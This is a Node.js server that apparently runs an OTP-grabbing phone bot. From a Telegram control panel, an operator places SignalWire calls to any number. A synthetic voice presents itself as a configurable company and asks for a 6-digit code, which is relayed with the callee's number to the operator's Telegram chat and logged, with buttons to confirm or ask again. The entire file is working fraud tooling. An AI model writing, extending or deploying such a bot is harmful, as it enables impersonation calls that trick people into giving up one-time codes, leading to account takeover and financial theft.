const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")

const app=express()

app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

// ENV
const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID

const SW_PROJECT=process.env.SW_PROJECT
const SW_TOKEN=process.env.SW_TOKEN
const SW_SPACE=process.env.SW_SPACE
const SW_NUMBER=process.env.SW_NUMBER

const BASE_URL=process.env.BASE_URL

// SETTINGS
let settings={
company:"Support",
digits:6,
assistant:"Nova"
}

const assistants={
Nova:"Polly.Amy",
Lyra:"Polly.Emma",
Orion:"Polly.Brian",
Astra:"Polly.Joanna",
Kairo:"Polly.Matthew",
Solara:"Polly.Amy"
}

// STATE
let activeCallSid=null
let activeCaller=null
let activeCode=null
let callStart=null
let panelMessage=null
let logs=[]
let pendingAction=null

function auth(){
return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
}

function duration(){
if(!callStart)return"00:00"
let s=Math.floor((Date.now()-callStart)/1000)
let m=String(Math.floor(s/60)).padStart(2,"0")
let sec=String(s%60).padStart(2,"0")
return`${m}:${sec}`
}

async function tg(method,data){
return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
}).then(r=>r.json())
}

async function tgSend(text,kb=null){
let p={chat_id:CHAT_ID,text:text}
if(kb)p.reply_markup={inline_keyboard:kb}
return tg("sendMessage",p)
}

async function updatePanel(){

if(!panelMessage)return

let text=`📞 IVR CONTROL PANEL

Caller: ${activeCaller||"none"}
Code: ${activeCode||"waiting"}

Duration: ${duration()}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${settings.assistant}`

try{
await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessage,
text:text,
reply_markup:{
inline_keyboard:[
[
{ text:"✔ Confirm",callback_data:"confirm"},
{ text:"🔁 Ask Again",callback_data:"again"}
],
[
{ text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{ text:"📞 Start Call",callback_data:"start_call"},
{ text:"☎ Call Last",callback_data:"call_last"}
],
[
{ text:"📊 Status",callback_data:"status"},
{ text:"📜 Logs",callback_data:"logs"}
]
]
}
})
}catch{}
}

async function updateCall(twiml){

if(!activeCallSid)return

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({Twiml:twiml})
})

}

async function startCall(number){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
From:SW_NUMBER,
To:number,
Url:`${BASE_URL}/ivr`
})
})

}

function log(result){

logs.unshift({
caller:activeCaller,
code:activeCode,
result,
time:new Date().toLocaleString()
})

logs=logs.slice(0,10)

}

// ROOT
app.get("/",(req,res)=>{
res.send("Server running")
})

// IVR
app.post("/ivr",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

if(!digits){

activeCallSid=sid
activeCaller=caller
activeCode=null
callStart=Date.now()

res.type("text/xml")
return res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr" method="POST" timeout="8">
<Say voice="${assistants[settings.assistant]}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
</Gather>
<Redirect>${BASE_URL}/ivr</Redirect>
</Response>
`)
}

activeCallSid=sid
activeCaller=caller
activeCode=digits
callStart=callStart||Date.now()

log("Code received")

await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`,[
[
{ text:"✔ Confirm",callback_data:"confirm"},
{ text:"🔁 Ask Again",callback_data:"again"}
],
[
{ text:"⛔ Hang Up",callback_data:"hangup"}
]
])

await updatePanel()

res.type("text/xml")
res.send(`
<Response>
<Say voice="${assistants[settings.assistant]}">
Thank you. Your code has been received.
</Say>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)

})

// HOLD LOOP
app.post("/hold",(req,res)=>{

res.type("text/xml")
res.send(`
<Response>
<Pause length="20"/>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)

})

// TELEGRAM
app.post("/telegram",async(req,res)=>{

const update=req.body

if(update.callback_query){

let action=update.callback_query.data

if(action=="confirm"){

await updateCall(`
<Response>
<Say voice="${assistants[settings.assistant]}">
Your code has been confirmed. Goodbye.
</Say>
<Hangup/>
</Response>
`)

log("Confirmed")
activeCallSid=null
callStart=null

await tgSend("✔ Call confirmed")

}

if(action=="again"){

await updateCall(`
<Response>
<Say>Please enter your code again.</Say>
<Redirect>${BASE_URL}/ivr</Redirect>
</Response>
`)

}

if(action=="hangup"){

await updateCall(`
<Response>
<Say>This call will now end.</Say>
<Hangup/>
</Response>
`)

log("Hung up")
activeCallSid=null
callStart=null

}

if(action=="call_last"){

if(activeCaller){
await startCall(activeCaller)
await tgSend(`☎ Calling last caller ${activeCaller}`)
}

}

if(action=="start_call"){
pendingAction="call"
await tgSend("Send the number to call")
}

}

if(update.message){

let text=update.message.text

if(pendingAction=="call"){
pendingAction=null
await startCall(text)
await tgSend(`📞 Calling ${text}`)
}

if(text=="/status"){
await tgSend(`Active: ${activeCaller||"none"}`)
}

if(text=="/logs"){

let t="📜 Logs\n\n"

logs.forEach((l,i)=>{
t+=`${i+1}. ${l.caller} ${l.code} ${l.result}\n`
})

await tgSend(t)

}

}

res.sendStatus(200)

})

setInterval(updatePanel,2000)

const PORT=process.env.PORT||3000

app.listen(PORT,async()=>{
console.log("Server running")
let msg=await tgSend("📞 IVR PANEL STARTED")
panelMessage=msg.result.message_id
})
